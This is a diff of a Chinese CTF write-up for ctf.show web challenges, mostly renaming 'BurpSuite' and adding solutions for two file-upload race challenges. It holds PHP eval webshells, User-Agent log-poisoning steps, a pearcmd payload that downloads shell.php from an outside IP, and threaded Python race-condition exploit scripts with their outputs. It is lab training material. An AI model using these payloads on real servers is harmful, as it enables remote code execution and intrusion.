@@ -661,11 +661,11 @@ Content-Length: 58
 
 点击`Secret.php`可以看到一行很大的文字`It doesn't come from 'https://www.Sycsecret.com'`。
 
-`BurpSuite`抓包新增`Referer:www.Sycsecret.com`后又出现了一行新的文字，`Please use "Syclover" browser`。
+`Burp Suite`抓包新增`Referer:www.Sycsecret.com`后又出现了一行新的文字，`Please use "Syclover" browser`。
 
-继续用`BurpSuite`将`User-Agent`修改为 `Syclover`后又出现了一行新的文字`No!!! you can only read this locally!!!`。
+继续用`Burp Suite`将`User-Agent`修改为 `Syclover`后又出现了一行新的文字`No!!! you can only read this locally!!!`。
 
-用`BurpSuite`添加`X-Forwarded-For:127.0.0.1`后可以拿到`flag`。
+用`Burp Suite`添加`X-Forwarded-For:127.0.0.1`后可以拿到`flag`。
 
 #### 解法2：Golang
 
@@ -1416,7 +1416,7 @@ Resolving deltas: 100% (14/14), done.
 
 > You are smart but you are not `admin`.
 
-`Burpsuite Pro`抓包，修改`Cookie`中的`guest`为`admin`，`send Repeater`以下内容：
+`Burp Suite Pro`抓包，修改`Cookie`中的`guest`为`admin`，`send Repeater`以下内容：
 
 ```
 POST /?name=flag HTTP/1.1
@@ -6394,7 +6394,7 @@ if(isset($_GET['c'])){
 <?php @eval($_POST['shell']);?>
 ```
 
-使用`BurpSuite`在请求头信息的`User-Agent`中插入`PHP`一句话木马。
+使用`Burp Suite`在请求头信息的`User-Agent`中插入`PHP`一句话木马。
 
 ```
 GET /?c=/var/log/nginx/access.log HTTP/1.1
@@ -6407,7 +6407,7 @@ Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
 Connection: keep-alive
 ```
 
-`BurpSuite`放行后，靶机显示的内容如下：
+`Burp Suite`放行后，靶机显示的内容如下：
 
 > 172.12.0.2 - - [22/Jan/2026:11:46:18 +0000] "GET / HTTP/1.1" 200 1450 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36" 172.12.0.2 - - [22/Jan/2026:11:47:46 +0000] "GET /?c=/var/log/nginx/access.log HTTP/1.1" 200 406 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36"
 
@@ -6454,7 +6454,7 @@ if(isset($_GET['c'])){
 ?>
 ```
 
-跟上题做法一样，用`BurpSuite`抓包后在请求头信息的`User-Agent`中插入`PHP`一句话木马，再用`AntSword`连接靶机。
+跟上题做法一样，用`Burp Suite`抓包后在请求头信息的`User-Agent`中插入`PHP`一句话木马，再用`AntSword`连接靶机。
 
 ```
 GET /?c=/var/log/nginx/access.log HTTP/1.1
@@ -6498,7 +6498,7 @@ if(isset($_GET['c'])){
 ?>
 ```
 
-故技重施，`BurpSuite`抓包后在`User-Agent`中插入`PHP`一句话木马，然后用`AntSword`连接靶机。
+故技重施，`Burp Suite`抓包后在`User-Agent`中插入`PHP`一句话木马，然后用`AntSword`连接靶机。
 
 ```
 GET /?c=/var/log/nginx/access.log HTTP/1.1
@@ -6542,7 +6542,7 @@ if(isset($_GET['c'])){
 ?>
 ```
 
-故技重施，`BurpSuite`抓包后在`User-Agent`中插入`PHP`一句话木马，然后用`AntSword`连接靶机。
+故技重施，`Burp Suite`抓包后在`User-Agent`中插入`PHP`一句话木马，然后用`AntSword`连接靶机。
 
 ```
 GET /?c=/var/log/nginx/access.log HTTP/1.1
@@ -6586,7 +6586,7 @@ if(isset($_GET['c'])){
 ?>
 ```
 
-一招鲜吃遍天好吧。`BurpSuite`抓包后在`User-Agent`中插入`PHP`一句话木马，再用`AntSword`连接。
+一招鲜吃遍天好吧。`Burp Suite`抓包后在`User-Agent`中插入`PHP`一句话木马，再用`AntSword`连接。
 
 ```
 GET /?c=/var/log/nginx/access.log HTTP/1.1
@@ -6650,13 +6650,13 @@ gcloud compute ssh --zone "us-west1-a" "ctf-vps" --project "project-ip"
 
 再用`python3 -m http.server 9999`启动一个**只读的静态文件 HTTP 服务器**，它不会执行PHP代码，不用担心我们在写题期间别人通过`AntSword`连接`shell.php`拿下服务器控制权限，因为这只是一个简单的文件共享服务器，当有人访问文件时，它只会原样返回文件的文本内容，并且访问者的IP能被监听到。
 
-因为之前的反弹shell题我是大胆地用博客站的云服务器，所以写Write Up时用VPS-IP指代来隐匿掉真实IP地址。这回是用Google Cloud中专门的`ctf-vps`，所以直接写IP地址也无妨。构造`Payload`如下：
+因为之前的反弹shell题我是大胆地用博客站的PHP云服务器，所以写Write Up时用VPS-IP指代来隐匿掉真实IP地址。这回是用Google Cloud专门的`ctf-vps`，所以直接写IP地址也无妨。构造`Payload`如下：
 
 ```
 /?c=pearcmd&+download+http://34.83.239.45:9999/shell.php
 ```
 
-`PHP`的`$_GET`只解析**标准query string**，`+download+...`被视为一个无效参数名（以 `+` 开头），`PHP`会忽略它，但这并不会影响`$_GET['c']` 的值。实际值`$c = "pearcmd"`与`.php`拼接得到`pearcmd.php`，而`pearcmd.php`是大多数旧版本`PHP`安装时的内置文件。`pearcmd.php` 是一个命令行工具的`Web`封装，但它存在严重的`RCE`漏洞！当靶机执行`include("pearcmd.php");`时，通过某种方式（如参数）触发执行`pear download http://34.83.239.45:9999/shell.php`。靶机的执行结果如下：
+`PHP`的`$_GET`只解析标准query string，`+download+...`被视为一个无效参数名（以 `+` 开头），`PHP`会忽略它，但这并不会影响`$_GET['c']` 的值。实际值`$c = "pearcmd"`与`.php`拼接得到`pearcmd.php`，而`pearcmd.php`是大多数旧版本`PHP`安装时的内置文件。`pearcmd.php` 是一个命令行工具的`Web`封装，但它存在严重的`RCE`漏洞！当靶机执行`include("pearcmd.php");`时，通过某种方式（如参数）触发执行`pear download http://34.83.239.45:9999/shell.php`。靶机的执行结果如下：
 
 ```
 downloading shell.php ... Starting to download shell.php (34 bytes) ....done: 34 bytes Could not get contents of package "/var/www/html/shell.php". Invalid tgz file. Download of "http://34.83.239.45:9999/shell.php" succeeded, but it is not a valid package archive Invalid or missing remote package file download failed
@@ -6682,9 +6682,250 @@ downloading shell.php ... Starting to download shell.php (34 bytes) ....done: 34
 
 ------
 
+###  萌新杯web23
+
+> 阿呆觉得最安全的代码就是什么都没有。
+
+靶机的源码如下：
+
+```html
+<!DOCTYPE html>
+<html>
+<head>
+	<title>文件上传</title>
+	<meta charset="utf-8">
+</head>
+<body>
+	<center>
+		<form action="upload.php" method="post" enctype="multipart/form-data">
+		<input type="file" name="file">
+		<input type="submit" name="上传">		
+	</form>
+	</center>
+</body>
+</html>
+```
+
+编写`PHP`一句话木马文件`shell.php`。
+
+```php
+<?php @eval($_POST['t0ur1st']);?>
+```
+
+直接上传`shell.php`的话，虽然靶机显示文件上传成功但是访问路径时却显示`404 Not Found`，并且告诉了我们这是一个`nginx`服务器，这意味着不能像`apache`服务器那样上传`.htaccess`文件将`.jpg`图片视为`.php`处理。
+
+再次选择文件`shell.php`上传，用`Burp Suite`抓包后修改文件类型和后缀名，靶机显示内容如下：
+
+> uploads/20260123074604125.jpg
+
+能够访问该`.jpg`文件，但是无法执行代码。我总感觉像是上传成功的`PHP`文件被立马删掉了。
+
+编写`Python`代码，尝试构造图片马上传后利用 Nginx 解析漏洞访问文件并执行命令行，也失败了。
+
+```php
+import requests
+import time
+
+url = "http://51fb812a-f6e9-43e6-bbdb-e3085e534920.challenge.ctf.show"
+files = {
+    'file': ('shell.jpg', b'GIF89a<?php system($_GET["cmd"]); ?>', 'image/jpeg')
+}
+
+resp = requests.post(f"{url}/upload.php", files=files)
+if "uploads/" in resp.text:
+    filename = resp.text.strip()
+    print(f"[+] Uploaded: {filename}")
+    exploit_url = f"{url}/{filename}/.php?cmd=ls"
+    result = requests.get(exploit_url)
+    print(result.text)
+else:
+    print("[-] Upload failed")
+```
+
+翻看[Write Up](https://wp.ctf.show/d/131-23-24)，得知`upload.php`的部分代码如下：
+
+```php
+$new_filename = date('YmdHis',time()).rand(100,1000).'.'.$ext_suffix;
+if (move_uploaded_file($temp_name, 'uploads/'.$new_filename)){
+	echo "uploads/$new_filename";
+	sleep(1);
+	system("rm -rf ./uploads/*.php");
+}
+```
+
+关键点在于`rand(100, 1000)`和`sleep(1)`。编写`Python`代码爆破时需要考虑以下几点：
+
+- 100 ~ 1000数量很多，线程太多反而影响效率，可以取个1/3，爆破100 ~ 400按概率算爆破三次左右就出来了。
+- 下一次文件名中时间戳的计算逻辑。两次上传间隔可以忽略，直接用上一次的时间+sleep得出下一次的时间，如果和本地时间比较由于只精确到秒误差反而较大，不容易成功。
+- 线程的使用，要异步执行的代码单起一个线程。通过线程套线程可以勉强实现：利用 `upload.php` 返回的文件名时间戳，预测下一次上传的文件名，并在文件被删除前（1秒窗口）并发爆破可能的随机后缀（100～400），抢在 `rm -rf *.php` 执行前访问 `.php` 文件以执行命令。
+
+```python
+import requests, time, threading
+
+url = "http://51fb812a-f6e9-43e6-bbdb-e3085e534920.challenge.ctf.show/"
+
+def newThread(fun,*args):
+    return threading.Thread(target=fun, args=args)
+
+def execphp(fname):
+    r = requests.get(url + "uploads/" + fname + ".php")
+    x = r.text
+    if len(x) > 0 and "404 Not Found" not in x and "容器已过期" not in x:
+        print(x)
+
+def check(fname):
+    for i in range(100,400):
+        # 每个文件名单起一个线程
+        newThread(execphp, fname + str(i)).start()
+
+def upload():
+    while True:
+        payload = '<?php system("ls -l ../");?>'.encode()
+        file_data = {'file':('anything.php', payload)}
+        r = requests.post(url+"upload.php",files=file_data)
+        txt = r.text
+        print("uploaded:",txt)
+        # 用本次的文件名推算下一次的文件名，相差sleep一次的时间间隔
+        ts = int(time.mktime(time.strptime(txt[8:22], "%Y%m%d%H%M%S")))
+        fname = time.strftime("%Y%m%d%H%M%S", time.localtime(ts + 1))
+        # 单起一个线程，爆破下一次upload的文件名
+        newThread(check, fname).start()
+
+if __name__ == '__main__':
+    upload()
+```
+
+运气不错，代码运行结果如下：
+
+```bash
+uploaded: uploads/20260123075737782.php
+uploaded: uploads/20260123075738677.php
+uploaded: uploads/20260123075739446.php
+total 16
+-rw-r--r--    1 www-data www-data        46 Jan 22 23:28 flaghere0.txt
+-rw-r--r--    1 www-data www-data       309 Mar 15  2020 index.php
+-rw-r--r--    1 www-data www-data       827 Mar 15  2020 upload.php
+drwxr-xr-x    2 www-data www-data      4096 Jan 22 23:57 uploads
+```
+
+`GET`请求访问`flaghere0.txt`得到`ctfshow{b7fddff6-d81d-477c-8da5-494a6761731e}`，提交即可。
+
+------
+
+### 萌新杯web24
+
+> 相比web23，随机数减少到300，延时增加到3秒。
+
+靶机的`upload.php`部分代码如下：
+
+```php
+$new_filename = date('YmdHis',time()).rand(0,300).'.'.$ext_suffix;
+if (move_uploaded_file($temp_name, 'uploads/'.$new_filename)){
+	echo "uploads/$new_filename";
+	sleep(3);
+	system("rm -rf ./uploads/*.php");
+}
+```
+
+多了3秒，编写`Python`代码尝试在删除之前访问上传成功的`PHP`文件，这是我最后的倔强。
+
+```python
+import requests
+
+url = "http://983696f3-e745-4034-a7fd-cb41144a92dc.challenge.ctf.show"
+files = {
+    'file': ('shell.php', b'<?php system("ls -l ../");?>')
+}
+
+resp = requests.post(f"{url}/upload.php", files=files)
+if "uploads/" in resp.text:
+    filename = resp.text.strip()
+    print(f"[+] Uploaded: {filename}")
+    exploit_url = f"{url}/{filename}"
+    r = requests.get(exploit_url)
+    if '404 Not Found' not in r.text:
+        print(r.text)
+    else:
+        print('Too late to not found.')
+        print(r.text)
+else:
+    print("[-] Upload failed")
+```
+
+代码运行结果如下：
+
+```html
+[+] Uploaded: uploads/20260123085434127.php
+Too late to not found.
+<html>
+<head><title>404 Not Found</title></head>
+<body>
+<center><h1>404 Not Found</h1></center>
+<hr><center>nginx/1.16.1</center>
+</body>
+</html>
+```
+
+还是得用上一题的方法爆破求解。利用 `upload.php` 返回的文件名时间戳，预测下一次上传的文件名，并在文件被删除前（3秒窗口）并发爆破可能的随机后缀（1～300），抢在 `rm -rf *.php` 执行前访问 `.php` 文件以执行命令。需要修改的是`check()`函数的`for`循环范围，以及`time.localtime(ts + 3)`。
+
+```python
+import requests, time, threading
+
+url = "http://983696f3-e745-4034-a7fd-cb41144a92dc.challenge.ctf.show/"
+
+def newThread(fun,*args):
+    return threading.Thread(target=fun, args=args)
+
+def execphp(filename):
+    r = requests.get(url + "uploads/" + filename + ".php")
+    x = r.text
+    if len(x) > 0 and "404 Not Found" not in x and "容器已过期" not in x:
+        print(x)
+
+def check(filename):
+    for i in range(1,300):
+        newThread(execphp, filename + str(i)).start()
+
+def upload():
+    while True:
+        payload = '<?php system("ls -l ../");?>'.encode()
+        file_data = {'file':('anything.php', payload)}
+        r = requests.post(url+"upload.php",files=file_data)
+        txt = r.text
+        print("uploaded:",txt)
+        ts = int(time.mktime(time.strptime(txt[8:22], "%Y%m%d%H%M%S")))
+        filename = time.strftime("%Y%m%d%H%M%S", time.localtime(ts + 3))
+        newThread(check, filename).start()
+
+if __name__ == '__main__':
+    upload()
+```
+
+基本上是一击必中好吧，代码运行结果如下：
+
+```
+uploaded: uploads/20260123090307129.php
+total 16
+-rw-r--r--    1 www-data www-data        46 Jan 23 00:42 flaghere0.txt
+-rw-r--r--    1 www-data www-data       309 Mar 15  2020 index.php
+-rw-r--r--    1 www-data www-data       824 Mar 15  2020 upload.php
+drwxr-xr-x    2 www-data www-data      4096 Jan 23 01:03 uploads
+
+uploaded: uploads/20260123091043168.php
+total 16
+-rw-r--r--    1 www-data www-data        46 Jan 23 00:42 flaghere0.txt
+-rw-r--r--    1 www-data www-data       309 Mar 15  2020 index.php
+-rw-r--r--    1 www-data www-data       824 Mar 15  2020 upload.php
+drwxr-xr-x    2 www-data www-data      4096 Jan 23 01:10 uploads
+```
+
+`GET`请求访问`flaghere0.txt`得到`ctfshow{425c52bd-2100-436b-870e-eb5b19872ad7}`，提交即可。
+
+------
+
 ### 获得百分之百的快乐
 
-> 阿呆开发了自己的博客系统，准备对欺负他的大佬口吐芬芳
+> 阿呆开发了自己的博客系统，准备对欺负他的大佬口吐芬芳。
 
 PHP代码审计，靶机的源码如下：
 
@@ -7018,7 +7259,7 @@ ctf.show_web4
 172.12.0.2 - - [19/Jan/2026:08:04:10 +0000] "GET / HTTP/1.1" 200 715 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36" 172.12.0.2 - - [19/Jan/2026:08:08:55 +0000] "GET /url=/var/log/nginx/access.log HTTP/1.1" 200 715 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36"
 ```
 
-使用`BurpSuite`在请求头信息的`User-Agent`中插入PHP木马`<?php @eval($_POST['shell']);?>`。
+使用`Burp Suite`在请求头信息的`User-Agent`中插入PHP木马`<?php @eval($_POST['shell']);?>`。
 
 随后web服务器的日志文件内容会多一条访问记录，但不会显示刚刚插入的一句话木马，因为日志文件中的代码会被执行但不会显示。
 
